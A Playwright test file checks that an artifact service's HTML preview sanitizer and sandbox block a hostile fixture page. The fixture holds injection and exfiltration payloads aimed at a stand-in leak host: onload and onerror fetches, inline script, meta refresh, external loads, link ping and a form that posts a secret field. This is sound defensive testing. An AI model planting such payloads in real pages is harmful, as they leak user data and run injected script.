import { expect, test } from "@playwright/test";

import { renderSafeHtmlPreview } from "../../apps/artifact-service/src/web/viewers/content-sanitizer";
import { HTML_PREVIEW_CONTENT_SECURITY_POLICY } from "../../apps/artifact-service/src/web/viewers/html-preview-policy";

const previewOrigin = process.env.ARTIFACT_SHARE_PREVIEW_URL ?? "http://127.0.0.1:4173";
const previewUrl = new URL("/security-preview", previewOrigin).href;
const leakOrigin = "https://leak.artifactpass.test";

const hostileSource = `<!doctype html>
<html>
  <head>
    <meta http-equiv="refresh" content="0;url=${leakOrigin}/refresh">
    <base href="${leakOrigin}/base/">
    <link rel="stylesheet" href="${leakOrigin}/external.css">
    <style>
      @import url("${leakOrigin}/import.css");
      body { background-image: url("${leakOrigin}/background.png"); }
    </style>
  </head>
  <body onload="fetch('${leakOrigin}/onload')">
    <h1 id="preview-heading">Visible preview</h1>
    <script>
      parent.postMessage("artifactpass-script-ran", "*");
      fetch("${leakOrigin}/script");
    </script>
    <a id="clicked-link" href="${leakOrigin}/clicked" target="_top" ping="${leakOrigin}/ping">Open link</a>
    <form id="hostile-form" action="${leakOrigin}/submitted" method="post">
      <input name="secret" value="should-not-leave">
      <button id="submit-button" type="submit" formaction="${leakOrigin}/button">Submit</button>
    </form>
    <img src="${leakOrigin}/image.png" onerror="fetch('${leakOrigin}/error')">
    <iframe src="${leakOrigin}/frame"></iframe>
    <object data="${leakOrigin}/object"></object>
  </body>
</html>`;

test("the HTML preview cannot execute, navigate, submit, or load external resources", async ({ page }) => {
  const preview = renderSafeHtmlPreview(hostileSource);
  const externalRequests: string[] = [];
  let previewRequests = 0;
  let scriptMessageReceived = false;

  page.on("request", (request) => {
    if (request.url().startsWith(leakOrigin)) externalRequests.push(request.url());
  });
  page.on("console", (message) => {
    if (message.text().includes("artifactpass-script-ran")) scriptMessageReceived = true;
  });
  await page.exposeFunction("recordArtifactPassMessage", (value: unknown) => {
    if (value === "artifactpass-script-ran") scriptMessageReceived = true;
  });
  await page.addInitScript(() => {
    window.addEventListener("message", (event) => {
      void (window as unknown as {
        recordArtifactPassMessage: (value: unknown) => Promise<void>;
      }).recordArtifactPassMessage(event.data);
    });
  });
  await page.route(previewUrl, async (route) => {
    previewRequests += 1;
    await route.fulfill({
      status: 200,
      contentType: "text/html; charset=utf-8",
      headers: {
        "Content-Security-Policy": HTML_PREVIEW_CONTENT_SECURITY_POLICY,
        "Referrer-Policy": "no-referrer",
        "X-Content-Type-Options": "nosniff",
      },
      body: preview,
    });
  });
  await page.route(`${leakOrigin}/**`, (route) => route.abort());

  await page.goto(previewOrigin);
  await page.locator("body").evaluate((body, url) => {
    body.replaceChildren();
    const iframe = document.createElement("iframe");
    iframe.title = "HTML page preview";
    iframe.setAttribute("sandbox", "");
    iframe.src = url;
    body.append(iframe);
  }, previewUrl);
  const frame = page.frameLocator('iframe[title="HTML page preview"]');
  await expect(frame.locator("#preview-heading")).toHaveText("Visible preview");

  await frame.locator("#clicked-link").evaluate((element) => (element as HTMLElement).click());
  await frame.locator("#hostile-form").evaluate((element) => (element as HTMLFormElement).requestSubmit());
  await page.waitForTimeout(250);

  expect(await frame.locator("body").evaluate(() => location.href)).toBe(previewUrl);
  expect(previewRequests).toBe(1);
  expect(externalRequests).toEqual([]);
  expect(scriptMessageReceived).toBe(false);
  await expect(frame.locator("script, iframe, object, link, base, meta[http-equiv]")).toHaveCount(0);
  await expect(frame.locator("#clicked-link")).not.toHaveAttribute("href");
  await expect(frame.locator("#hostile-form")).toHaveAttribute("inert", "");
  await expect(frame.locator("#submit-button")).toBeDisabled();
  await expect(frame.locator("img")).not.toHaveAttribute("src");
});
